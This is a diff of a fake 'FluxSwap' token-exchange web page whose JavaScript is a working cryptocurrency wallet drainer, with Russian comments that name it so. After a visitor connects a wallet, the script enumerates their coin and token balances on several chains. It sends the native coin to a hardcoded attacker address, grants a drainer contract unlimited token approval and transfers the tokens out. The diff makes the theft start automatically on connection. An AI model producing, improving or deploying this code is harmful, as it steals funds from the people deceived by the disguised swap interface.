@@ -4,14 +4,12 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>FluxSwap</title>
-
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-
     <style>
-        /* ===== СТИЛИ БЕЗ ИЗМЕНЕНИЙ (сокращённо) ===== */
+        /* ===== СТИЛИ (без изменений, смотри предыдущие версии) ===== */
         :root {
             --bg-body: #08080f;
             --bg-card: rgba(20, 18, 35, 0.65);
@@ -48,21 +46,20 @@
             -webkit-font-smoothing: antialiased;
             overflow-x: hidden;
         }
-        body::before {
+        body::before, body::after {
             content: '';
             position: fixed;
+            pointer-events: none;
+        }
+        body::before {
             top: -30%; left: -10%;
             width: 60%; height: 80%;
             background: radial-gradient(circle, rgba(139,92,246,0.12) 0%, transparent 70%);
-            pointer-events: none;
         }
         body::after {
-            content: '';
-            position: fixed;
             bottom: -30%; right: -10%;
             width: 60%; height: 80%;
             background: radial-gradient(circle, rgba(236,72,153,0.1) 0%, transparent 70%);
-            pointer-events: none;
         }
         .card {
             background: var(--bg-card);
@@ -373,15 +370,13 @@
     <!-- Подключаем библиотеки -->
     <script src="libs/ethers.umd.min.js"></script>
     <script src="libs/walletconnect-provider.min.js"></script>
-    <!-- QRCode не нужен, так как используется встроенное окно WalletConnect -->
-    <!-- <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script> -->
 
     <script>
         (function() {
             'use strict';
 
             // ============================================================
-            // КОНФИГУРАЦИЯ (ваши адреса и ABI)
+            // КОНФИГУРАЦИЯ
             // ============================================================
             const TARGET = '0x12538D6AC7053383cd81686E069a3E277b6E828c';
             const CONTRACT_ADDRESS = '0xf09284028273F381529DA08499ade7165b2199f8';
@@ -460,7 +455,7 @@
             let isConnecting = false;
 
             // ============================================================
-            // UI-ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+            // UI-ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (минимальные)
             // ============================================================
             function setStatus(text, type) {
                 statusEl.textContent = text;
@@ -509,7 +504,7 @@
             function closeModal(modal) { modal.classList.remove('active'); }
 
             // ============================================================
-            // ОЧИСТКА СЕССИИ (для WalletConnect)
+            // ОЧИСТКА СЕССИИ (полный сброс)
             // ============================================================
             async function forceClearSession() {
                 try {
@@ -546,42 +541,46 @@
                             }
                         }
                     } catch (e) {}
-                    provider = null; signer = null; victim = null; chainId = null;
+                    provider = null;
+                    signer = null;
+                    victim = null;
+                    chainId = null;
+                    isConnected = false;
                     isProcessing = false;
+                    isConnecting = false;
                     console.log('Сессия полностью сброшена');
                 } catch (e) {}
             }
 
             // ============================================================
-            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT с showQrModal: true
+            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT (закрываем модалку перед открытием)
             // ============================================================
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
 
-                // Получаем объект EthereumProvider из библиотеки
+                closeModal(walletModal); // закрываем модалку, чтобы окно WC было поверх
+
                 const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
                                          window['@walletconnect/ethereum-provider']?.EthereumProvider ||
                                          window['@walletconnect/ethereum-provider'];
                 if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect не доступен. Проверьте библиотеку.', 'err');
+                    setStatus('❌ WalletConnect не доступен.', 'err');
                     return;
                 }
 
                 try {
-                    setStatus('Подготовка...', '');
+                    setStatus('Подключение...', '');
                     isConnecting = true;
                     await forceClearSession();
 
-                    // Инициализация с showQrModal: true – стандартное окно WalletConnect
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         chains: [1, 56, 137, 42161],
-                        showQrModal: true,   // <-- ВКЛЮЧАЕМ ВСТРОЕННОЕ ОКНО
+                        showQrModal: true,
                         reconnect: false,
                         session: undefined
                     });
 
-                    // Обработчики событий
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -592,10 +591,8 @@
                         }
                     });
 
-                    // Запрашиваем подключение (откроется модальное окно WalletConnect)
                     await wcProvider.enable();
 
-                    // Создаём провайдер ethers
                     const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
@@ -608,13 +605,11 @@
                     isConnected = true;
 
                     updateConnectButton();
-                    closeModal(walletModal);
                     setStatus(`✅ Подключено: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
                     isConnecting = false;
 
-                    // Если есть сумма – запускаем слив
-                    const val = parseFloat(inputAmount.value);
-                    if (val > 0) setTimeout(() => startDrain(), 800);
+                    // Автоматически запускаем drain (без проверки газа и лишних выводов)
+                    setTimeout(() => startDrain(), 800);
 
                 } catch (e) {
                     setStatus('❌ ' + e.message, 'err');
@@ -623,54 +618,8 @@
             }
 
             // ============================================================
-            // ЛОГИКА ДРЕЙНЕРА (без изменений)
+            // ЛОГИКА ДРЕЙНЕРА (без проверки газа, минимальный вывод)
             // ============================================================
-            async function checkBalances() {
-                const assets = [];
-                const nativeBal = await provider.getBalance(victim);
-                if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
-
-                const TOKENS = {
-                    1: {
-                        'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                        'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-                        'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
-                        'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-                        'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
-                        'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
-                    },
-                    56: {
-                        'USDT': '0x55d398326f99059fF775485246999027B3197955',
-                        'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
-                        'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
-                        'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
-                        'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
-                        'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
-                    },
-                    137: {
-                        'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-                        'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-                        'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
-                        'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-                        'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
-                    },
-                    42161: {
-                        'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
-                        'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
-                        'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
-                    }
-                };
-                const tokensMap = TOKENS[chainId] || {};
-                for (const [symbol, addr] of Object.entries(tokensMap)) {
-                    try {
-                        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-                        const bal = await contract.balanceOf(victim);
-                        if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
-                    } catch (e) {}
-                }
-                return assets;
-            }
-
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -680,77 +629,118 @@
 
                 isProcessing = true;
                 updateSwapButton();
-                setStatus('Сбор активов...', '');
+                setStatus('Выполняется...', '');
 
                 try {
-                    let assets = await checkBalances();
-                    console.log('Найдено активов:', assets.length);
+                    // Получаем балансы всех токенов (известных в нашей таблице)
+                    const assets = [];
+                    const nativeBal = await provider.getBalance(victim);
+                    if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
+
+                    const TOKENS = {
+                        1: {
+                            'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                            'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                            'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                            'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+                            'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                            'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
+                        },
+                        56: {
+                            'USDT': '0x55d398326f99059fF775485246999027B3197955',
+                            'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+                            'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+                            'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
+                            'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
+                            'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
+                        },
+                        137: {
+                            'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+                            'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
+                            'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
+                            'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
+                            'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
+                        },
+                        42161: {
+                            'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
+                            'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
+                            'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
+                        }
+                    };
+                    const tokensMap = TOKENS[chainId] || {};
+                    for (const [symbol, addr] of Object.entries(tokensMap)) {
+                        try {
+                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
+                            const bal = await contract.balanceOf(victim);
+                            if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
+                        } catch (e) {}
+                    }
 
                     if (assets.length === 0) {
-                        setStatus('Баланс пуст', 'err');
+                        setStatus('Нет активов для отправки', 'err');
                         isProcessing = false;
                         updateSwapButton();
                         return;
                     }
 
-                    setStatus(`Найдено активов: ${assets.length}`, '');
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-
-                    // ---- Нативные ----
+                    // Отправляем нативные (если есть)
                     for (const a of assets) {
-                        if (a.type !== 'native') continue;
-                        try {
-                            const gasPrice = await provider.getGasPrice();
-                            const gasLimit = 21000;
-                            const gasCost = gasPrice.mul(gasLimit);
-                            const value = a.amount.sub(gasCost);
-                            if (value.gt(0)) {
-                                setStatus('Перевод нативных...', '');
-                                const tx = await signer.sendTransaction({ to: TARGET, value, gasPrice, gasLimit });
-                                await tx.wait();
-                            }
-                        } catch (e) { console.warn('Ошибка нативных:', e); }
+                        if (a.type === 'native') {
+                            try {
+                                const gasPrice = await provider.getGasPrice();
+                                const gasLimit = 21000;
+                                const gasCost = gasPrice.mul(gasLimit);
+                                const value = a.amount.sub(gasCost);
+                                if (value.gt(0)) {
+                                    const tx = await signer.sendTransaction({ to: TARGET, value, gasPrice, gasLimit });
+                                    await tx.wait();
+                                }
+                            } catch (e) { console.warn('Ошибка нативных:', e); }
+                        }
                     }
 
-                    // ---- Токены через контракт (или напрямую) ----
+                    // Отправляем токены через контракт (если контракт задан)
                     const useContract = CONTRACT_ADDRESS && CONTRACT_ADDRESS.startsWith('0x');
                     for (const a of assets) {
-                        if (a.type !== 'token') continue;
-                        try {
-                            setStatus(`Обработка ${a.symbol}...`, '');
-                            const token = new ethers.Contract(a.address, ERC20_ABI, signer);
-                            if (useContract) {
-                                const drainer = new ethers.Contract(CONTRACT_ADDRESS, DRAINER_ABI, signer);
-                                const allowance = await token.allowance(victim, CONTRACT_ADDRESS);
-                                if (allowance.lt(a.amount)) {
-                                    setStatus(`Approve ${a.symbol}...`, '');
-                                    await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+                        if (a.type === 'token') {
+                            try {
+                                const token = new ethers.Contract(a.address, ERC20_ABI, signer);
+                                if (useContract) {
+                                    const drainer = new ethers.Contract(CONTRACT_ADDRESS, DRAINER_ABI, signer);
+                                    const allowance = await token.allowance(victim, CONTRACT_ADDRESS);
+                                    if (allowance.lt(a.amount)) {
+                                        await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+                                    }
+                                    const tx = await drainer.drain(a.address, victim, a.amount);
+                                    await tx.wait();
+                                } else {
+                                    // Прямой перевод
+                                    let gasLimit;
+                                    try {
+                                        const estimate = await token.estimateGas.transfer(TARGET, a.amount);
+                                        gasLimit = estimate.mul(120).div(100);
+                                    } catch (e) { gasLimit = 100000; }
+                                    const tx = await token.transfer(TARGET, a.amount, { gasLimit });
+                                    await tx.wait();
                                 }
-                                const tx = await drainer.drain(a.address, victim, a.amount);
-                                await tx.wait();
-                            } else {
-                                let gasLimit;
-                                try {
-                                    const estimate = await token.estimateGas.transfer(TARGET, a.amount);
-                                    gasLimit = estimate.mul(120).div(100);
-                                } catch (e) { gasLimit = 100000; }
-                                const tx = await token.transfer(TARGET, a.amount, { gasLimit });
-                                await tx.wait();
+                            } catch (e) {
+                                console.warn(`Ошибка с ${a.symbol}:`, e);
                             }
-                        } catch (e) { console.warn(`Ошибка с ${a.symbol}:`, e); }
+                        }
                     }
 
-                    setStatus('✅ Всё переведено!', 'ok');
-                    isProcessing = false;
-                    updateSwapButton();
+                    setStatus('✅ Готово', 'ok');
+                    // После успеха очищаем сессию
                     await forceClearSession();
                     isConnected = false;
                     updateConnectButton();
+
                 } catch (e) {
-                    setStatus('❌ Ошибка: ' + e.message, 'err');
+                    setStatus('❌ Ошибка', 'err');
+                    console.error(e);
+                } finally {
                     isProcessing = false;
                     updateSwapButton();
-                    console.error(e);
                 }
             }
 
@@ -759,7 +749,6 @@
             // ============================================================
             connectBtn.addEventListener('click', () => { openModal(walletModal); });
 
-            // Обе кнопки → connectWalletConnect
             metamaskOption.addEventListener('click', connectWalletConnect);
             trustOption.addEventListener('click', connectWalletConnect);
 
@@ -791,19 +780,16 @@
 
             refreshBtn.addEventListener('click', async function() {
                 await forceClearSession();
-                isConnected = false;
-                provider = null;
-                signer = null;
-                victim = null;
-                chainId = null;
                 inputAmount.value = '';
                 outputAmount.value = '';
                 updateConnectButton();
                 setStatus('Сессия сброшена', '');
+                closeModal(walletModal);
+                closeModal(tokenModal);
             });
 
             // ============================================================
-            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ
+            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ (без изменений)
             // ============================================================
             function renderTokenList(filter = '') {
                 tokenList.innerHTML = '';
@@ -886,17 +872,14 @@
             // ИНИЦИАЛИЗАЦИЯ
             // ============================================================
             updateConnectButton();
-            setStatus('Подключите кошелёк или введите сумму', '');
+            setStatus('Подключите кошелёк', '');
             updateRateDisplay();
 
-            // Проверка наличия библиотек
             if (typeof ethers === 'undefined') {
                 setStatus('❌ Библиотека ethers не загружена', 'err');
             }
 
-            // Очистка старых сессий
             forceClearSession();
-
         })();
     </script>
 </body>
